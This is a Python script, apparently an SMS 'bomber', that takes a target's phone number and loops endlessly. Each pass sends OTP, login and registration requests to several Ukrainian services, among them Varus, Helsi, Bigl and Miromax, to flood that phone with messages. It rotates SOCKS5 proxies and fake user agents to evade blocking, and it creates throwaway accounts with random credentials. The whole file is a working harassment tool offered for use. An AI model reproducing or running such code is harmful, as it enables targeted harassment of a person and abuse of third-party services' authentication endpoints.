import fake_useragent
import requests
import socks
import socket
import random
import time
import random
import string

phone = input("Введи номер с + (ANTONENKO IVAN): ")





with open('Webshare 9 proxies (1).txt', 'r') as file:
    proxies = [line.strip() for line in file]

while True:
    email = ""
    password = ""
    prefix = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
    suffix = ''.join(random.choice(string.ascii_lowercase) for _ in range(3))
    domain = "gmail.com"
    email = f"{prefix}BPT{suffix}BPT{random.randint(100, 999)}{suffix}@{domain}"
    password = f"BPT{random.randint(100, 999)}BPT{random.randint(100, 999)}{suffix}"
    proxy_url = random.choice(proxies)

    proxy_parts = proxy_url.split(':')
    proxy_ip = proxy_parts[0]
    proxy_port = int(proxy_parts[1])
    proxy_username = proxy_parts[2]
    proxy_password = proxy_parts[3]

    user_agent = fake_useragent.UserAgent()
    headers = {
        "User-Agent": user_agent.random
    }

    socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port, username=proxy_username, password=proxy_password)
    socket.socket = socks.socksocket

    try:
        s = requests.post("https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", headers=headers,
                          json={'phone': phone})
        print("(VARUS) Запрос отправлен с User-Agent:", headers["User-Agent"], "через прокси:", proxy_url)
    except Exception as e:
        print("(VARUS) Ошибка при отправке запроса:", str(e))

    try:
        s = requests.post("https://ucb.l.podorozhnyk.com/api/send/otp", headers=headers, json={"phone": phone[1:13]})
        print("(PODOROZHNYK) Запрос отправлен с User-Agent:", headers["User-Agent"], "через прокси:", proxy_url)
    except Exception as e:
        print("(PODOROZHNYK) Ошибка при отправке запроса:", str(e))

    try:
        s = requests.post("https://my.bigl.ua/api/auth/phone_email_step", headers=headers, json={'phone': phone})
        print("(BIGL) Запрос отправлен с User-Agent:", headers["User-Agent"], "через прокси:", proxy_url)
    except Exception as e:
        print("(BIGL) Ошибка при отправке запроса:", str(e))

    try:
        s = requests.post("https://api.parasol.ua/api/login/sms", headers=headers, json={"phone": phone})
        print("(PARASOL) Запрос отправлен с User-Agent:", headers["User-Agent"], "через прокси:", proxy_url)
    except Exception as e:
        print("(PARASOL) Ошибка при отправке запроса:", str(e))

    try:
        s = requests.post("https://auth2.multiplex.ua/login", headers=headers, json={"login": phone[1:13]})
        print("(MULTIPLEX) Запрос отправлен с User-Agent:", headers["User-Agent"], "через прокси:", proxy_url)
    except Exception as e:
        print("(MULTIPLEX) Ошибка при отправке запроса:", str(e))

    try:
        s = requests.post("https://helsi.me/api/healthy/v2/accounts/login", headers=headers,
                          json={"phone": phone[1:13]})
        print("(HELSI) Запрос отправлен с User-Agent:", headers["User-Agent"], "через прокси:", proxy_url)
    except Exception as e:
        print("(HELSI) Ошибка при отправке запроса:", str(e))

    try:
        s = requests.post("https://api.tengo.ua/api/v1/user-register?language=uk", headers=headers, json={ "mobile": phone})
        print("(TENGO) Запрос отправлен с User-Agent:", headers["User-Agent"], "через прокси:", proxy_url)
    except Exception as e:
        print("(TENGO) Ошибка при отправке запроса:", str(e))

    try:
        s = requests.post("https://miromax.film/api/auth/register", headers=headers, json={ "email": email, "password": password, "password_confirmation": password,"phone": phone[3:13]})
        print("(MIROMAX) Запрос отправлен с User-Agent: 1", headers["User-Agent"], "через прокси:", proxy_url)
        if s.status_code == 200:
            print("Top")
        time.sleep(5)
        try:
            s = requests.post("https://miromax.film/api/auth/recovery", headers=headers, json={"phone": phone[3:13]})
            print("(MIROMAX) Запрос отправлен с User-Agent: 2", headers["User-Agent"], "через прокси:", proxy_url)
            if s.status_code == 200:
                print("Top")
        except:
            print("(MIROMAX) Ошибка при отправке запроса: 2", str(e))
    except Exception as e:
        print("(MIROMAX) Ошибка при отправке запроса: 1", str(e))

    time.sleep(1)
